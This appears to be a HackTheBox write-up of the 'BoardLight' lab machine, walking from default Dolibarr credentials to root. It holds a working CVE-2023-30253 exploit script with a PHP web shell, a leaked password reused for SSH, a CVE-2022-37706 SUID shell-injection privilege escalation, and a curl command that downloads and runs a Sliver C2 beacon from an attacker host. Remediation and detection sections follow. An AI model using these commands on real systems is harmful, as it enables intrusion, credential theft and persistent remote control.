---
layout: default
title: "HackTheBox - BoardLight"
---

# HackTheBox - BoardLight

**OS:** Ubuntu 20.04 (Linux)

BoardLight is a Linux machine hosting a static corporate site and a `crm.board.htb` virtual
host running Dolibarr ERP 17.0.0. Default admin credentials grant access to the website
module, which is vulnerable to CVE-2023-30253: the lowercase `<?php` extension blacklist can
be bypassed by using `<?PHP` (uppercase) in page content, giving authenticated remote code
execution as `www-data`. The Dolibarr configuration file contains the database password,
which the `larissa` system account reuses for SSH, yielding the user flag. Privilege
escalation abuses a set of SUID `enlightenment` binaries (version 0.23.1) vulnerable to
CVE-2022-37706: `enlightenment_sys` passes a semicolon-delimited mount-point path to a
shell, executing an attacker-controlled script as root.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (board.htb / crm.board.htb) |
| Initial Access | Dolibarr 17.0.0 default creds + CVE-2023-30253 PHP injection -> www-data RCE -> DB password reuse -> SSH as larissa |
| Privilege Escalation | CVE-2022-37706 enlightenment_sys SUID shell injection -> root |
| Final Access | `root` |

---

## Recon

### Port Scan

Two services are exposed: SSH and an Apache web server.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.2p1 (Ubuntu 20.04) |
| 80 | TCP | HTTP | Apache 2.4.41 (Ubuntu) |

```
$ nmap -sCV -p22,80 <target-ip>
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http  Apache httpd 2.4.41
```

### Web Fingerprinting

Fingerprinting the root HTTP service with whatweb reveals a contact email that leaks the
internal domain name:

```
$ whatweb --no-errors -a 3 http://<target-ip>
http://<target-ip> [200 OK] Apache[2.4.41], Bootstrap[4.3.1],
Email[info@board.htb], JQuery[3.4.1], ...
```

> **Why this works:** developers often hard-code a real internal email address in the contact
> section of a static marketing page without realising it also exposes the domain. A single
> `Email[]` WhatWeb tag replaces a manual page review.

Add `board.htb` and `crm.board.htb` to `/etc/hosts`:

```
$ echo '<target-ip> board.htb crm.board.htb' | sudo tee -a /etc/hosts
```

### Virtual-Host Enumeration

The main site at `board.htb` is a static brochure. Testing `crm.board.htb` directly returns
a Dolibarr ERP login page, confirmed by the `DOLSESSID_` session cookie and the page title:

```
$ curl -sI http://crm.board.htb/
HTTP/1.1 200 OK
Set-Cookie: DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=...; HttpOnly; SameSite=Lax
```

The title of the login page confirms the version:

```
<title>Login @ 17.0.0</title>
```

---

## Initial Access

### Dolibarr Default Credentials

Dolibarr ships with default credentials `admin:admin`. Testing them against the login form
at `http://crm.board.htb/index.php?mainmenu=home` succeeds, landing on the admin dashboard.

> **Gotcha worth recording:** the login POST must go to `/index.php?mainmenu=home`, not
> `/index.php`. Sending to the bare path returns 200 but keeps you on the login page because
> the CSRF token validation path differs. Also, cookies must be scoped to the hostname
> `crm.board.htb`, not the raw IP, or they are not sent back on subsequent requests.

### CVE-2023-30253: Dolibarr PHP Code Injection via Uppercase Extension

Dolibarr 17.0.0 and earlier filter `<?php` tags when writing website page content to disk,
but the check is case-sensitive. Substituting `<?PHP` (any capitalisation) bypasses the
blacklist. An authenticated user with access to the Website module can:

1. Create a website container via `action=addsite`.
2. Create a page via `action=addcontainer` with `radiocreatefrom=checkboxcreatemanually`.
3. Overwrite the page content via `action=updatesource` with `<?PHP system($_GET["cmd"]); ?>`.
4. Access the rendered page at `/public/website/index.php?website=<name>&pageref=<page>` to
   execute arbitrary commands as `www-data`.

The exploit flow in full:

```python
# 1. Login - POST to /index.php?mainmenu=home
token = get_token("/index.php")
session.post("http://crm.board.htb/index.php", params={"mainmenu": "home"}, data={
    "token": token, "actionlogin": "login", "loginfunction": "loginfunction",
    "username": "admin", "password": "admin", "backtopage": "",
})

# 2. Create a website
token = get_token("/website/index.php")
session.post("http://crm.board.htb/website/index.php", data={
    "token": token, "action": "addsite", "website": "-1",
    "WEBSITE_REF": site_name, "WEBSITE_LANG": "en", "addcontainer": "Create",
})

# 3. Create a page - get the pageid from the select[name=pageid] response
token = get_token("/website/index.php")
r = session.post("http://crm.board.htb/website/index.php", data={
    "token": token, "action": "addcontainer", "website": site_name,
    "radiocreatefrom": "checkboxcreatemanually", "WEBSITE_TYPE_CONTAINER": "page",
    "sample": "empty", "WEBSITE_TITLE": page_name, "WEBSITE_PAGENAME": page_name,
    "WEBSITE_LANG": "en", "addcontainer": "Create",
})
# Parse pageid from <select name="pageid"><option selected value="N">

# 4. Inject PHP payload (<?PHP uppercase bypasses the filter)
token = get_token("/website/index.php")
session.post("http://crm.board.htb/website/index.php", data={
    "token": token, "action": "updatesource", "website": site_name,
    "pageid": page_id, "update": "Save",
    "PAGE_CONTENT": f'<section id="x" contenteditable="true"><?PHP system($_GET["cmd"]); ?></section>',
})

# 5. Trigger
requests.get(f"http://crm.board.htb/public/website/index.php",
    params={"website": site_name, "pageref": page_name, "cmd": "id"})
```

Confirming execution:

```
$ curl -s "http://crm.board.htb/public/website/index.php?website=<site>&pageref=<page>&cmd=id"
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```

### Credential Reuse: Dolibarr Config to SSH

The Dolibarr configuration file is readable by `www-data`:

```
$ curl "...&cmd=cat+/var/www/html/crm.board.htb/htdocs/conf/conf.php"
<?php
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

The system user list shows a single non-service account, `larissa`. Testing the database
password for SSH access succeeds:

```
$ ssh larissa@<target-ip>
larissa@<target-ip>'s password: serverfun2$2023!!

larissa@boardlight:~$ cat ~/user.txt
<user-flag-redacted>
```

> **Why this works:** database credentials and OS user passwords are configured separately,
> but administrators frequently set both to the same value. Any credential found in a config
> file is worth spraying against every interactive account on the box.

---

## Post-Exploitation Enumeration

Checking for SUID binaries in standard locations:

```
larissa@boardlight:~$ find /usr /bin /sbin -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/bin/sudo
/usr/bin/su
...
```

The Enlightenment window manager utilities are SUID. Checking the version:

```
larissa@boardlight:~$ dpkg -l enlightenment
hi  enlightenment  0.23.1-4  amd64  X11 window manager based on EFL
```

Version 0.23.1 is vulnerable to CVE-2022-37706.

---

## Privilege Escalation

### CVE-2022-37706: enlightenment_sys SUID Shell Injection

`enlightenment_sys` is a SUID helper that wraps `/bin/mount`. It constructs a shell command
using the caller-supplied mount-point path without sanitising semicolons. By providing a path
of the form `/dev/../tmp/;/tmp/exploit`, the shell splits it at the semicolon and executes
`/tmp/exploit` as root.

Setting up the exploit:

```
larissa@boardlight:~$ set +H            # disable bash history expansion (avoids ! issues)

# Write the payload script
larissa@boardlight:~$ printf '#!/bin/sh\nchmod 4777 /bin/bash\n' > /tmp/priv
larissa@boardlight:~$ chmod +x /tmp/priv
larissa@boardlight:~$ cat /tmp/priv
#!/bin/sh
chmod 4777 /bin/bash

# Create required directory structure
larissa@boardlight:~$ mkdir -p /tmp/net
larissa@boardlight:~$ mkdir -p "/dev/../tmp/;/tmp/priv"
```

Triggering the exploit:

```
larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \
    /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \
    "/dev/../tmp/;/tmp/priv" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.
```

> **Why this works:** `enlightenment_sys` passes the mount point as a literal shell argument
> without quoting or sanitisation. The kernel `mount` call rejects it (not in fstab), but the
> shell has already split the argument at `;` and executed `/tmp/priv` as root before mount
> even runs. The SUID bit causes the entire invocation to run with `euid=0`.

Checking the result and reading the root flag:

```
larissa@boardlight:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1183448 Apr 18  2022 /bin/bash

larissa@boardlight:~$ /bin/bash -p -c "id; cat /root/root.txt"
uid=1000(larissa) gid=1000(larissa) euid=0(root) groups=1000(larissa),4(adm)
<root-flag-redacted>
```

Restoring `/bin/bash` to its original permissions after reading the flag:

```
larissa@boardlight:~$ /bin/bash -p -c "chmod 755 /bin/bash"
larissa@boardlight:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

---

## Post-Exploitation: C2 (Sliver)

With a shell as `larissa`, a Sliver HTTPS beacon was deployed to demonstrate a persistent C2
channel. An existing `pool-https-linux64` build (generated against `10.10.16.21:4443`) was
transferred via a temporary HTTP server and executed in-memory via `nohup`:

```
# On attack box: serve the beacon
$ python3 -m http.server 8080 --directory ~/engagements/_pool/htb/

# On target (via SSH as larissa)
larissa@boardlight:~$ curl -so /tmp/.beacon http://10.10.16.21:8080/pool-https-linux64
larissa@boardlight:~$ chmod +x /tmp/.beacon
larissa@boardlight:~$ nohup /tmp/.beacon &>/dev/null &
[1] 1886
```

Beacon checked in over HTTPS (port 4443):

```
sliver > beacons
ID                                   Name                 Transport  Remote Address           Hostname     Username  OS     Arch   Interval  Last Check-in
==================================   ===================  =========  =======================  ===========  ========  =====  =====  ========  =============
12a01615-132d-4f93-ac88-3b4bc9764de2 pool-https-linux64  http(s)    10.129.231.37:52378      boardlight   larissa   linux  amd64  1m        just now
```

Two C2 commands demonstrated:

```
sliver (pool-https-linux64) > execute id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)

sliver (pool-https-linux64) > execute hostname
boardlight
```

Beacon killed and implant removed from disk after demonstration.

---

## Root Cause

Two independent weaknesses chain to full compromise:

1. **Default Dolibarr credentials** (`admin:admin`) grant access to the Website module.
2. **CVE-2023-30253**: case-sensitive extension filtering allows `<?PHP` to bypass the PHP
   blacklist, enabling authenticated RCE.
3. **Credential reuse**: the Dolibarr database password is identical to the `larissa` SSH
   password.
4. **CVE-2022-37706**: Enlightenment 0.23.1 SUID helpers do not sanitise semicolons in
   mount-point paths, allowing shell injection as root.

---

## Impact

An unauthenticated attacker with access to the web interface can achieve full root compromise:
initial access requires only the default Dolibarr credentials, after which a public exploit
yields OS command execution, credential recovery, and SSH access. Local privilege escalation
to root requires only a standard user shell.

---

## Remediation

| Priority | Action |
|---|---|
| Critical | Change Dolibarr admin password from default; enforce strong credential policy |
| Critical | Upgrade Dolibarr to 17.0.1 or later (CVE-2023-30253 patched) |
| High | Use a unique, randomly generated database password; do not reuse it as an OS account password |
| High | Upgrade or remove Enlightenment 0.23.1; the patched release addresses CVE-2022-37706 |
| Medium | Remove SUID bits from Enlightenment helper binaries if the desktop environment is not in use |
| Low | Restrict website module access to users who genuinely need it |

### Validation

- Attempt login with `admin:admin` — should fail after credential change.
- Send `<?PHP` payload to the Dolibarr website updatesource endpoint — should be rejected after upgrade.
- Run `find /usr -perm -4000 -name 'enlightenment*'` — should return nothing after SUID removal.

---

## Detection Opportunities

| Signal | Event / Indicator |
|---|---|
| Dolibarr default-cred login | Apache access log: POST `/index.php?mainmenu=home` with successful 302 to `/admin/` |
| Website module abuse | Apache access log: POST to `/website/index.php` with `action=updatesource` followed by GET to `/public/website/index.php` |
| PHP execution in documents dir | File creation in `/var/www/html/crm.board.htb/documents/website/` with `.php` or `.PHP` extension |
| Credential reuse SSH login | SSH auth log: `Accepted password for larissa from <external-ip>` |
| enlightenment_sys abuse | Audit log: `execve` of `enlightenment_sys` with arguments containing `/dev/../tmp/;` |
| SUID bash | Inotify / file integrity: `chmod` event on `/bin/bash` changing mode to 4777 |

---

## Lessons Learned

- Subdomain enumeration is mandatory even when only one open port is HTTP; CRM/admin apps
  frequently live behind a virtual host that is invisible from the IP alone.
- Check default credentials before attempting any exploit; Dolibarr's `admin:admin` is
  documented in the project's own quickstart guide.
- Case-sensitivity in input validation is a recurring class of bypass: uppercase variants
  of blocked strings (`<?PHP`, `.PHP`, `SELECT` in SQLi filters) should be explicitly tested.
- Application config files are a reliable credential source when you have OS-level file read;
  always compare found credentials against every interactive account.
- SUID enumeration should target specific well-known paths (`/usr`, `/bin`, `/sbin`, `/opt`)
  with a short timeout rather than scanning the whole filesystem.

---

## Cleanup

- Deleted Dolibarr website containers created during exploitation.
- Removed `/tmp/.beacon` and `/tmp/priv` from target.
- Restored `/bin/bash` permissions to `755` after CVE-2022-37706 demo.
- No AD objects modified; no persistent backdoors left.
- Sliver beacon killed; HTTPS listener left running (standing pool infrastructure).
- HTB machine terminated via `htb stop`.
